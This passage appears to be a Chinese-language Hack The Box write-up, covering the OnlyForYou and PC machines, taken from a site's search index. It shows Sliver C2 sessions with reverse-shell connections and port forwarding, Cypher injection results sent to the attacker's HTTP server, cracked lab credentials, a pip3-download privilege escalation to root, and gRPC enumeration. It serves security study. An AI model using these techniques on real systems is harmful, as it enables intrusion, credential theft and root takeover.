================= ============= ==================\n udp        127.0.0.1:48897   127.0.0.53:53     ESTABLISHED   0/               \n udp        127.0.0.53:53     0.0.0.0:0                       0/               \n udp        0.0.0.0:68        0.0.0.0:0                       0/               \n tcp        127.0.0.1:3306    0.0.0.0:0         LISTEN        0/               \n tcp        0.0.0.0:80        0.0.0.0:0         LISTEN        1049/nginx       \n tcp        127.0.0.53:53     0.0.0.0:0         LISTEN        0/               \n tcp        0.0.0.0:22        0.0.0.0:0         LISTEN        0/               \n tcp        127.0.0.1:3000    0.0.0.0:0         LISTEN        0/               \n tcp        127.0.0.1:8001    0.0.0.0:0         LISTEN        0/               \n tcp        127.0.0.1:33060   0.0.0.0:0         LISTEN        0/               \n tcp6       127.0.0.1:7474    :::0              LISTEN        0/               \n tcp6       :::22             :::0              LISTEN        0/               \n tcp6       127.0.0.1:7687    :::0              LISTEN        0/\n\n\nsliver (SMILING_WET-BAR) &gt; netstat \n\n Protocol   Local Address         Foreign Address    State         PID/Program Name     \n========== ===================== ================== ============= ======================\n tcp        only4you.htb.:48422   10.xx.xx.xx:4444   ESTABLISHED   5111/python3         \n tcp        only4you.htb.:44230   10.xx.xx.xx:4444   CLOSE_WAIT    1438/python3         \n tcp        only4you.htb.:32794   10.xx.xx.xx:4444   CLOSE_WAIT    1250/python3         \n tcp        localhost:3000        localhost:41604    ESTABLISHED   0/                   \n tcp        localhost:3000        localhost:41616    ESTABLISHED   0/                   \n tcp        only4you.htb.:59626   10.xx.xx.xx:4444   CLOSE_WAIT    2215/python3         \n tcp        only4you.htb.:39926   dns.google.:53     SYN_SENT      0/                   \n tcp        localhost:3000        localhost:41624    ESTABLISHED   0/\n</code></pre></p> <p>\u914d\u7f6e\u7aef\u53e3\u8f6c\u53d1\uff1a <pre><code>sliver (SMILING_WET-BAR) &gt; portfwd add -b 10.xx.xx.xx:7474 -r 127.0.0.1:7474\n\n[*] Port forwarding 10.xx.xx.xx:7474 -&gt; 127.0.0.1:7474\n\n\nsliver (SMILING_WET-BAR) &gt; portfwd \n\n ID   Session ID                             Bind Address       Remote Address \n==== ====================================== ================== ================\n  1   bd9e189d-515d-43a8-913d-8bf558991ee8   10.xx.xx.xx:3000   127.0.0.1:3000 \n  2   bd9e189d-515d-43a8-913d-8bf558991ee8   10.xx.xx.xx:8001   127.0.0.1:8001 \n  3   bd9e189d-515d-43a8-913d-8bf558991ee8   10.xx.xx.xx:7474   127.0.0.1:7474\n</code></pre></p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#socks5-proxy","title":"socks5 proxy","text":"<p>\u540e\u6765\u770b\u522b\u4eba\u7684WP\u4e86\u89e3\u5230\u53ef\u4ee5 <code>socks start</code> \u5f00\u542fsocks5\u4ee3\u7406\u2026\u2026\u7136\u540e\u5728\u6d4f\u89c8\u5668\u914d\u7f6e\u4ee3\u7406\u5c31\u597d\u4e86</p> <p>\u8bd5\u4e86\u4e0bkali\u6d4f\u89c8\u5668\u8bbf\u95ee\u51e0\u4e2a\u7aef\u53e3\u90fd\u6ca1\u95ee\u9898\u3002</p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#_6","title":"\u521d\u6b65\u6d4f\u89c8\u5404\u4e2a\u672c\u5730\u7aef\u53e3","text":"","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#3000","title":"3000","text":"<p>\u662f\u4e2a\u53ebGogs\u7684\u4ec0\u4e48git\u670d\u52a1\u3002</p> <p>\u53d1\u73b0\u4e24\u4e2a\u7528\u6237 </p> <p>\u53e6\u6709\u767b\u9646\u754c\u9762\uff0c\u4e0d\u77e5\u9053\u80fd\u5426SQLi\u3002 \u4e0d\u8fc7\u611f\u89c9\u662f\u62ff\u5230\u4e86\u8fd9\u4fe9\u7528\u6237\u7684\u5bc6\u7801\u4e4b\u540e\uff0c\u767b\u9646\u8fdb\u6765\u770b\u811a\u672c\u6f0f\u6d1e\u4ec0\u4e48\u7684\uff1f</p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#8001","title":"8001","text":"<p>\u53c8\u4e00\u4e2a\u767b\u9646\u754c\u9762 </p> <p>\u770b\u4e86\u773cwappalyzer\uff0cdeployment\u9879\u76ee\u91cc\u6709Gogs\u3002\u90a3\u5e94\u8be5\u5c31\u662f\u548c\u7aef\u53e33000\u914d\u5957\u7684\uff1f</p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#7474","title":"7474","text":"<p>\u6ca1\u600e\u4e48\u89c1\u8fc7\uff0c\u4f3c\u4e4e\u53ebNeo4j\u3002\u67e5\u4e86\u4e0b\u662f\u4e2aNoSQL\u56fe\u5f62\u6570\u636e\u5e93 </p> <p>\u4e5f\u641e\u6e05\u695a\u4e86\u53e6\u4e00\u4e2a\u7aef\u53e37687  </p> <p>Neo4j is a graph database management system developed by Neo4j. Default ports are 6362 (Backup), 7474 (HTTP), 7473 (HTTPS), 7687 (Bolt).</p> <p>hacktricks\u4e5f\u6709\u76f8\u5173\u6587\u7ae0\uff0chacktricks - Cypher Injection (neo4j)\uff0c\u4e0d\u8fc7\u6ca1\u770b\u61c2\u2026\u2026</p> <p>\u6ca1\u61c2\u600e\u4e48\u6ce8\u5165\uff0c\u5c31\u60f3\u7740\u6cb9\u7ba1\u770b\u770b\u5b9e\u64cd\uff0c\u7136\u540e\u770byoutube - Cypher Query Injection\u8fd9\u4e2a\u89c6\u9891\u624d\u660e\u767d\u539f\u6765\u8fd9\u4e2a\u201cCypher\u201d\u4e0d\u662f\u5bc6\u7801\uff0c\u800c\u662f\u201cOpen Cypher\u201d\u2026\u2026 \u7b80\u5355\u770b\u4e86\u4e0b\u5c31\u662f\u7c7b\u4f3cSQLi\u3002\u4f46\u662f\u53c2\u6570\u5728\u54ea\u554a\u2026\u2026</p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#3000_1","title":"\u5f31\u5bc6\u7801\u767b\u9646\u672c\u5730\u7aef\u53e33000","text":"<p>\u5f31\u5bc6\u7801\uff0cadmin:admin\u3002\u8fdb\u53bb\u540e\u770bTasks\u6807\u6ce8\u201c\u8fc1\u79fb\u5230\u65b0\u6570\u636e\u5e93Neo4j\u201d\u3002\u90a3\u6709\u53ef\u80fd\u8fd9\u8fb9\u624d\u662f\u6ce8\u5165\u7684\u5730\u65b9\u3002</p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#cypher-query-injection","title":"Cypher Query Injection","text":"<p>\u53c2\u7167\u4e0a\u9762\u51e0\u7bc7\u6587\u7ae0\uff0c\u7528python\u5728\u672c\u5730\u5f00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u8fdb\u884c\u6d4b\u8bd5\u3002 \u7136\u540e\u5728EMPLOYEES\u83dc\u5355\u7684\u641c\u7d22\u6846\u53d1\u73b0\u6ce8\u5165\u70b9\uff0c\u53ef\u4ee5\u8fdb\u884c\u66b4\u5e93\u3002 \u4e00\u5f00\u59cb\u590d\u5236payload\u5728CyberChef\u666e\u901a\u5730\u9009\u4e0aURL\u7f16\u7801\u4e0d\u5927\u884c\uff0c\u540e\u9762\u6ce8\u610f\u5230payload\u91cc\u9762\u6709\u52a0\u53f7\uff0c\u7136\u540e\u5728CyberChefURL\u7f16\u7801\u65f6\u52fe\u4e0a\u5904\u7406\u6240\u6709\u7279\u6b8a\u5b57\u7b26\u624d\u6ce8\u5165OK\u3002 \u800c\u4e14admin\u767b\u9646\u4f1a\u8bdd\u8fd8\u6709\u65f6\u9650\uff0c\u8fc7\u4e00\u6bb5\u65f6\u95f4\u603b\u8981\u518d\u6b21\u767b\u9646\u83b7\u53d6\u6d3b\u8dc3\u4f1a\u8bdd\u624d\u80fd\u987a\u5229POST\u6ce8\u5165payload \u4ee5\u53ca\u4e8b\u540e\u56de\u987e\u624d\u53d1\u73b0\u8fd9\u6b21\u771f\u662f\u597d\u8fd0\uff0c\u53c2\u8003\u6587\u7ae0\u7684payload\u91cc\u8fd9\u4e2a <code>MATCH (f:user)</code> \u662f\u6b63\u597d\u8fd9\u6b21\u679a\u4e3e\u51fa\u6765\u6709\u7684label\u3002\u5f53\u65f6\u662f\u60f3\u90fd\u6ca1\u60f3\u76f4\u63a5\u590d\u5236\u7740\u7528\u4e86\uff0c\u8981\u662f\u4e0d\u884c\u7684\u8bdd\u6307\u4e0d\u5b9a\u4f1a\u5361\u591a\u4e45\u2026\u2026 \u8fd8\u6709\u4e0d\u5927\u660e\u767d\u4e3a\u4ec0\u4e48\u4e00\u6b21\u8bf7\u6c42\u4f1a\u8fd4\u56de\u597d\u591a\u6761\u54cd\u5e94\u2026\u2026</p> <pre><code>\u2514\u2500$ python -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.210 - - [31/May/2023 08:10:16] code 400, message Bad request syntax ('GET /?version=5.6.0&amp;name=Neo4j Kernel&amp;edition=community HTTP/1.1')\n10.10.11.210 - - [31/May/2023 08:10:16] \"GET /?version=5.6.0&amp;name=Neo4j Kernel&amp;edition=community HTTP/1.1\" 400 -\n10.10.11.210 - - [31/May/2023 08:10:38] code 400, message Bad request syntax ('GET /?version=5.6.0&amp;name=Neo4j Kernel&amp;edition=community HTTP/1.1')\n10.10.11.210 - - [31/May/2023 08:29:19] \"GET /?version=5.6.0&amp;name=Neo4j Kernel&amp;edition=community HTTP/1.1\" 400 -\n\n10.10.11.210 - - [31/May/2023 08:29:28] \"GET /?label=user HTTP/1.1\" 200 -\n10.10.11.210 - - [31/May/2023 08:29:28] \"GET /?label=employee HTTP/1.1\" 200 -\n\u2026\u2026\n\n10.10.11.210 - - [31/May/2023 08:30:28] \"GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1\" 200 -\n10.10.11.210 - - [31/May/2023 08:30:28] \"GET /?username=admin HTTP/1.1\" 200 -\n10.10.11.210 - - [31/May/2023 08:30:28] \"GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1\" 200 -\n10.10.11.210 - - [31/May/2023 08:30:29] \"GET /?username=john HTTP/1.1\" 200 -\n\u2026\u2026\n</code></pre>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#_7","title":"\u83b7\u5f97\u51ed\u636e","text":"<p>\u5bc6\u7801\u4e00\u5f00\u59cb\u60f3\u7740 <code>john</code> \u66b4\u7834\u4e0d\u8fc7\u6ca1\u6210\u529f\uff0c<code>hash-identifier</code>\u751a\u81f3\u628a\u5bc6\u6587\u8bc6\u522b\u4e3aSHA-256\u3002 \u540e\u6765\u76f4\u63a5\u6254\u8fdb\u8fd9\u91cc\u8bd5\u4e86\u4e0b\u5c31\u51fa\u6765\u4e86\uff1ahttps://www.somd5.com/</p> <p>\u5c06log\u7a0d\u4f5c\u6574\u7406\uff0c\u5e76\u89e3\u5bc6\u540e\uff0c\u6211\u4eec\u5f97\u5230\u4e86\u5982\u4e0b\u4fe1\u606f\uff1a</p> username password \u89e3\u5bc6 admin 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 admin john a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 ThisIs4You <p>\u8bb0\u5f97\u8fd8\u6709\u4e2a\u672c\u5730\u7aef\u53e33000\uff0cadmin\u5f31\u5bc6\u7801\u4e4b\u524d\u8bd5\u8fc7\u4e86\uff0c\u7528john\u8fdb\u53bb\u770b\u770b\u6709\u4ec0\u4e48\u4fe1\u606f\u3002\u4e0d\u8fc7\u5f88\u9057\u61be\u53ea\u6709\u4e00\u4e2aTest\u4ed3\u5e93\uff0c\u8fd8\u662f\u79c1\u4eba\u7684\uff0c\u6ca1\u4efb\u4f55\u6709\u7528\u7684\u4fe1\u606f\u4e86\u3002</p> <p>\u4e0d\u8fc7\u7a81\u7136\u60f3\u8d77\u6765SSH\uff0c\u6bd5\u7adf\u5bb6\u76ee\u5f55\u6709\u4ed6\u3002\u672c\u5730\u7aef\u53e3\u8fd9\u8fb9\u6253\u592a\u4e45\u4e86\u90fd\u8981\u5fd8\u4e86\u8fd9\u56de\u4e8b\u2026\u2026</p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#ssh","title":"SSH\u767b\u9646","text":"<pre><code>Last login: Tue Apr 18 07:46:32 2023 from 10.10.14.40\njohn@only4you:~$ id\nuid=1000(john) gid=1000(john) groups=1000(john)\n</code></pre>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#flag-user","title":"flag: user","text":"<pre><code>john@only4you:~$ cat user.txt \n94ad\u2026\u2026e03a\n</code></pre>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#privilege-escalation","title":"Privilege Escalation","text":"<p>\u6709\u5bc6\u7801\u7684\u7528\u6237\uff0c\u4e0a\u6765\u5148\u770b\u770b <code>sudo -l</code>\uff1a <pre><code>john@only4you:~$ sudo -l \nMatching Defaults entries for john on only4you:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser john may run the following commands on only4you:\n    (root) NOPASSWD: /usr/bin/pip3 download http\\://127.0.0.1\\:3000/*.tar.gz\n</code></pre></p> <p>\u6709\u901a\u914d\u7b26\uff0c\u8f83\u53ef\u7591\u3002 \u4e0d\u8fc7\u7a81\u7834\u53e3\u5176\u5b9e\u662f\u5728\u524d\u534a\u90e8\u5206\u7684 <code>pip3 download</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u8c37\u6b4c\u627e\u5230\u8fd9\u7bc7\u6587\u7ae0\uff1aMalicious Python Packages and Code Execution via pip download</p> <p>\u6839\u636e\u6587\u7ae0\u6307\u793a\u6784\u5efa\u4e00\u4e2atar.gz\u6587\u4ef6\u3002 \u7136\u540e\u5728Gogs\u65b0\u5efa\u4e00\u4e2a\u4ed3\u5e93\uff0c\u6b63\u597d\u4e4b\u524d\u53d1\u73b0john\u7528\u6237\u53ef\u4ee5\u7528\uff0c\u5c06tar.gz\u6587\u4ef6\u4e0a\u4f20\u3002</p> <p>\u8fd0\u884c\uff1a \u9776\u673a\u4f1a\u81ea\u52a8\u6e05\u7406\u4ed3\u5e93\u7684\u6837\u5b50 \u4e0b\u8f7d\u4ed3\u5e93\u7684tar.gz\u6587\u4ef6\u6ce8\u610f\u8981\u9009\u62e9\u201craw\u201d</p> <pre><code>john@only4you:~$ ls -l /usr/bin/bash\n-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /usr/bin/bash\njohn@only4you:~$ sudo /usr/bin/pip3 download http\\://127.0.0.1\\:3000/john/exp/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz\nCollecting http://127.0.0.1:3000/john/exp/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz\n  Downloading http://127.0.0.1:3000/john/exp/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz\n     - 2.7 kB 8.2 MB/s\n  Saved ./this_is_fine_wuzzi-0.0.1.tar.gz\nSuccessfully downloaded this-is-fine-wuzzi\njohn@only4you:~$ ls -l /usr/bin/bash\n-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /usr/bin/bash\n</code></pre>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#flag-root","title":"flag: root","text":"<pre><code>john@only4you:~$ bash -p\nbash-5.0# id\nuid=1000(john) gid=1000(john) euid=0(root) groups=1000(john)       \nbash-5.0# cat /root/root.txt \n156a\u2026\u20263d3a\n</code></pre>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#_8","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2023/05/31</p> <p>\u96be\u2026\u2026\u5df2\u7ecf\u5565\u90fd\u4e0d\u60f3\u8bf4\u4e86\u3002\u60f3\u5410\u69fd\u7684\u4ee5\u53ca\u4e0d\u592a\u61c2\u7684\u5730\u65b9\u90fd\u8fb9\u6253\u8fb9\u5199\u4e86\uff08\u659c\u4f53\uff09\u2026\u2026</p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-PC/","title":"HTB-PC","text":"<p>\u7531\u4e8e\u6709\u90e8\u5206\u662f\u8fb9\u5199\u8fb9\u6253\uff0c\u6709\u90e8\u5206\u662f\u6253\u4e86\u540e\u5199\uff0c\u6240\u4ee5\u9776\u673aIP\u548cpayload\u7ec6\u8282\uff08\u5982id\u3001token\u7684\u503c\uff09\u4f1a\u6709\u5dee\u5f02\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#_1","title":"\u626b\u63cf","text":"<p>\u4e00\u5f00\u59cb\u60ef\u4f8b\u53ea\u626b\u4e861-10000\u7aef\u53e3\uff0c\u53d1\u73b0\u53ea\u670922\u5c31\u611f\u89c9\u4e0d\u5bf9\u3002\u4e8e\u662f\u7d22\u6027\u626b\u4e86\u5168TCP\u548cUDP\u7aef\u53e3\u3002\u7ed3\u679c\u53ea\u6709TCP\u7aef\u53e3\u5f00\u653e\u4e86\u3002</p> <ul> <li>22</li> <li>50051</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#_2","title":"\u6f0f\u6d1e\u5206\u6790","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#50051","title":"50051\u7aef\u53e3","text":"<p>\u8c37\u6b4c\u4e86\u4e00\u4e0b\u4f3c\u4e4e\u662fgRPC\u7684\u9ed8\u8ba4\u7aef\u53e3\u3002\u7136\u540e\uff0c\u7136\u540e\u5c31\u5361\u4f4f\u4e86\u2026\u2026</p> <p>\u5728\u7fa4\u91cc\u5e08\u5085\u7684\u63d0\u70b9\u4e0b\u4e86\u89e3\u5230\u4e86 <code>grpcui</code> \u8fd9\u4e2a\u5de5\u5177\uff0c\u4e0d\u8fc7\u6ca1\u548b\u5f04\u61c2\u2026\u2026 \u5012\u662f\u7ed9\u6211\u6253\u5f00\u4e86\u601d\u8def\u3002\u5c31\u50cfpostman\uff0c\u539f\u6765\u627e\u5230\u548cgrpc\u670d\u52a1\u5668\u4ea4\u4e92\u3001\u8c03\u8bd5\u7684\u65b9\u6cd5\u5c31\u597d\uff0c\u4e8e\u662f\u8c37\u6b4c\u641c\u4e86\u4e0b\u201cgrpc debug\u201d\uff0c\u5728\u8fd9\u7bc7\u6587\u7ae0\u4e2d\u770b\u5230\u8bb8\u591a\u5de5\u5177\u3002 \u540e\u6765\u624d\u53d1\u89c9\u539f\u6765postman\u4e5f\u80fd\u8c03\u8bd5grpc\uff0c\u4e00\u76f4\u4ee5\u4e3a\u53ea\u662f\u641eREST API\u7684\u3002</p> <p>\u7a0d\u5fae\u770b\u4e86\u770b\u611f\u89c9\u8fd8\u662f <code>grpcurl</code> \u4f7f\u7528\u4e0a\u8f83\u7b80\u5355\u3002\u7f51\u4e0a\u4e5f\u6709\u8bb8\u591a\u57fa\u7840\u4f7f\u7528\u6559\u7a0b\uff0c\u76f4\u63a5\u770bgitlab\u6587\u6863\u4e5f\u4e0d\u9519\u3002</p> <p>\u7531\u4e8e\u4e0d\u5927\u60f3\u5b89\u88c5\u5f88\u6742\u7684\u4e1c\u897f\u5230kali\uff0c\u672c\u6765\u60f3\u7740\u7528docker\u5b89\u88c5\uff0c\u4e0d\u8fc7run\u7684\u65f6\u5019\u62a5\u9519\u4e0d\u662f\u5f88\u61c2\u2026\u2026\u7559\u4e2a\u5751\uff0c\u62a5\u9519\u4fe1\u606f\uff1a <pre><code>\u2514\u2500$ docker run fullstorydev/grpcurl host.docker.internal:443 list\nFailed to dial target host \"host.docker.internal:443\": context deadline exceeded\n</code></pre></p> <p>\u7ed3\u679c\u8fd8\u662f\u9009\u62e9\u5b89\u88c5\u5230kali\u2026\u2026 \u4e0d\u8fc7\u4e0b\u8f7d\u4e4b\u540e\u624d\u53d1\u73b0\u539f\u6765\u53ea\u662f\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u554a\u2026\u2026\u633a\u597d  </p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#grpcurl","title":"grpcurl\u679a\u4e3e\u4fe1\u606f","text":"<p>\u7136\u540e\u6839\u636egrpc\u7684\u6587\u6863\u5f00\u59cb\u6574\u8d77\u6765\uff1a <pre><code>\u2514\u2500$ ./grpcurl -plaintext 10.129.40.24:50051 list\nSimpleApp\ngrpc.reflection.v1alpha.ServerReflection\n\n\u2514\u2500$ ./grpcurl -plaintext 10.129.40.24:50051 describe              \nSimpleApp is a service:\nservice SimpleApp {\n  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );\n  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );\n  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );\n}\ngrpc.reflection.v1alpha.ServerReflection is a service:\nservice ServerReflection {\n  rpc ServerReflectionInfo ( stream .grpc.reflection.v1alpha.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1alpha.ServerReflectionResponse );\n}\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#grpcurl_1","title":"grpcurl\u8c03\u7528\u65b9\u6cd5","text":"<pre><code>\u2514\u2500$ ./grpcurl -plaintext 10.129.40.24:50051 SimpleApp/getInfo\n{\n  \"message\": \"Authorization Error.Missing 'token' header\"\n}\n\n\u2514\u2500$ ./grpcurl -plaintext 10.129.40.24:50051 SimpleApp/LoginUser\n{\n  \"message\": \"Login unsuccessful\"\n}\n\n\u2514\u2500$ ./grpcurl -plaintext 10.129.40.24:50051 SimpleApp/RegisterUser\n{\n  \"message\": \"username or password must be greater than 4\"\n}\n</code></pre> <p>\u611f\u89c9\u53ef\u4ee5\u5148\u6ce8\u518c\u4e00\u4e2a\u7528\u6237\u7136\u540e\u8bd5\u8bd5\u767b\u9646\uff1f \u5177\u4f53\u9700\u8981\u4ec0\u4e48\u53c2\u6570\u53ef\u4ee5\u7528 <code>describe</code> \u67e5\u770b\uff1a <pre><code>\u2514\u2500$ ./grpcurl -plaintext 10.129.40.24:50051 describe .RegisterUserRequest          \nRegisterUserRequest is a message:\nmessage RegisterUserRequest {\n  string username = 1;\n  string password = 2;\n}\n\n\u2514\u2500$ ./grpcurl -plaintext -d '{\"username\":\"test1\", \"password\":\"123456\"}' 10.129.40.24:50051 SimpleApp/RegisterUser\n{\n  \"message\": \"Account created for user test1!\"\n}\n\n\u2514\u2500$ ./grpcurl -plaintext -d '{\"username\":\"test1\", \"password\":\"123456\"}' 10.129.40.24:50051 SimpleApp/LoginUser   \n{\n  \"message\": \"Your id is 53.\"\n}\n\n\u2514\u2500$ ./grpcurl -plaintext 10.129.40.24:50051 describe .getInfoRequest    \ngetInfoRequest is a message:\nmessage getInfoRequest {\n  string id = 1;\n}\n\n\u2514\u2500$ ./grpcurl -plaintext -d '{\"id\":\"53\"}' 10.129.40.24:50051 SimpleApp/getInfo \n{\n  \"message\": \"Authorization Error.Missing 'token' header\"\n}\n</code></pre></p> <p>\u6ce8\u518c\u3001\u767b\u9646\u5012\u662f\u6210\u529f\u4e86\uff0c\u4e0d\u8fc7\u5361\u5728\u8fd9\u2026\u2026\u4e0d\u77e5\u9053\u8fd9\u662f\u5565\u610f\u601d\u3002\u8bd5\u4e86\u4e0b <code>-H</code> \u52a0\u62a5\u5934\u4e5f\u6ca1\u7528\u2026\u2026 \u8c37\u6b4c\u4e86\u5404\u79cd\u5173\u4e8e\u62a5\u5934\u548c\u8ba4\u8bc1\u7684debug\uff0c\u7b2c\u4e8c\u5929\u63a5\u7740\u6765\u5c1d\u8bd5\u4e86\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u4e0b\u9762\u7684\u5404\u79cd\u7ec4\u5408\uff0c\u7ed3\u679c\u90fd\u62a5\u540c\u4e00\u79cd\u9519 <pre><code>\u2514\u2500$ ./grpcurl -plaintext -H 'token:dGVzdDE6MTIzNDU2' -d '{\"id\":\"470\"}' 10.129.40.145:50051 SimpleApp/getInfo\n\n\u2514\u2500$ ./grpcurl -plaintext -H 'Authorization:Bearer dGVzdDE6MTIzNDU2' -d '{\"id\":\"470\"}' 10.129.40.145:50051 SimpleApp/getInfo\n\n\u2514\u2500$ ./grpcurl -plaintext -rpc-header 'Authorization:Bearer dGVzdDE6MTIzNDU2' -d '{\"id\":\"470\"}' 10.129.40.145:50051 SimpleApp/getInfo\n</code></pre></p> <p>\u81f3\u4e8e\u4e0a\u9762\u7684token\u5b57\u7b26\u4e32\u662f\u600e\u4e48\u6765\u7684\uff0c\u8fd9\u662f\u6211\u81ea\u5df1\u5f04\u7684base64\u7f16\u7801\u2026\u2026\u56e0\u4e3a\u597d\u50cf\u641c\u5173\u4e8etoken\u8ba4\u8bc1\u65f6\u770b\u5230\u8bf4\u662f\u8fd9\u6837\u7f16\u7801\u7684\u2026\u2026 <pre><code>\u2514\u2500$ echo -n \"test1:123456\" |base64\ndGVzdDE6MTIzNDU2\n</code></pre></p> <p>\u540e\u6765\u5b9e\u5728\u4e0d\u884c\u6211\u90fd\u6000\u7591\u662f\u4e0d\u662f\u56e0\u4e3atoken\u8fc7\u671f\u5565\u7684\uff0c\u4e8e\u662f\u5c31\u53c8\u4ece\u5934\u641e\u4e86\u4e00\u904d\uff0c\u624d\u53d1\u73b0\u81ea\u5df1\u7f16\u7801token\u771f\u662f\u50bb\u4e86\u2026\u2026</p> <p>\u8fd9\u6b21\u771f\u662f\u4e5f\u662f\u5076\u7136\u3002 \u5728\u4e4b\u524d\u7684\u5404\u79cd\u5c1d\u8bd5\u4e2d\u90fd\u6ca1\u52a0\u4e0a <code>-vv</code>\uff0c\u5bfc\u81f4\u9519\u8fc7\u4e86\u91cd\u8981\u4fe1\u606f\u3002\u540e\u6765\u53c2\u8003\u5404\u79cdgrpcurl\u547d\u4ee4\u7684\u4f7f\u7528\u8bf4\u660e\u65f6\u624d\u65e0\u610f\u4e2d\u52a0\u4e86\u8fd9\u4e2a\u9009\u9879\u3002 \u6240\u4ee5\u8fd9\u6b21\u91cd\u65b0\u6765\u4e00\u904d\u624d\u53d1\u73b0\u539f\u6765\u767b\u9646\u6210\u529f\u540e\u670d\u52a1\u5668\u6709\u8fd4\u56detoken\u5b57\u7b26\u4e32\uff1a <pre><code>\u2514\u2500$ ./grpcurl -vv -plaintext -d '{\"username\":\"test1\", \"password\":\"123456\"}' 10.129.40.145:50051 SimpleApp/RegisterUser\n\nResolved method descriptor:\nrpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );\n\nRequest metadata to send:\n(empty)\n\nResponse headers received:\ncontent-type: application/grpc\ngrpc-accept-encoding: identity, deflate, gzip\n\nEstimated response size: 33 bytes\n\nResponse contents:\n{\n  \"message\": \"Account created for user test1!\"\n}\n\nResponse trailers received:\n(empty)\nSent 1 request and received 1 response\n\n\u2514\u2500$ ./grpcurl -vv -plaintext -d '{\"username\":\"test1\", \"password\":\"123456\"}' 10.129.40.145:50051 SimpleApp/LoginUser \n\nResolved method descriptor:\nrpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );\n\nRequest metadata to send:\n(empty)\n\nResponse headers received:\ncontent-type: application/grpc\ngrpc-accept-encoding: identity, deflate, gzip\n\nEstimated response size: 17 bytes\n\nResponse contents:\n{\n  \"message\": \"Your id is 655.\"\n}\n\nResponse trailers received:\ntoken: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdDEiLCJleHAiOjE2ODQ4MTQ5Mzl9.qp1J8frK9Hdn6_i0Q00uLTG9Y77omoCfGqwalRZRiyw'\nSent 1 request and received 1 response\n</code></pre> \u60f3\u60f3\u4e5f\u662f\u54e6\u2026\u2026\u5c31\u7c7b\u6bd4HTTP\u7684\u54cd\u5e94\uff0ctoken\u8fd9\u79cd\u4fe1\u606f\u4e0d\u4e5f\u662f\u5728\u653e\u62a5\u5934\u800c\u4e0d\u662f\u54cd\u5e94\u4f53\u91cc\u561b\u2026\u2026</p> <p>\u7528\u5b83\u54cd\u5e94\u7684token\u5012\u662f\u89e3\u51b3\u4e86\u4e4b\u524d\u7684\u62a5\u9519\uff0c\u4f46\u662f\u51fa\u73b0\u4e86\u65b0\u95ee\u9898\uff1a <pre><code>\u2514\u2500$ ./grpcurl -vv -plaintext -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdDEiLCJleHAiOjE2ODQ4MTQ5Mzl9.qp1J8frK9Hdn6_i0Q00uLTG9Y77omoCfGqwalRZRiyw' -d '{\"id\":\"655\"}' 10.129.40.145:50051 SimpleApp/getInfo\n\nResolved method descriptor:\nrpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );\n\nRequest metadata to send:\ntoken: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdDEiLCJleHAiOjE2ODQ4MTQ5Mzl9.qp1J8frK9Hdn6_i0Q00uLTG9Y77omoCfGqwalRZRiyw\n\nResponse headers received:\n(empty)\n\nResponse trailers received:\ncontent-type: application/grpc\nSent 1 request and received 0 responses\nERROR:\n  Code: Unknown\n  Message: Unexpected &lt;class 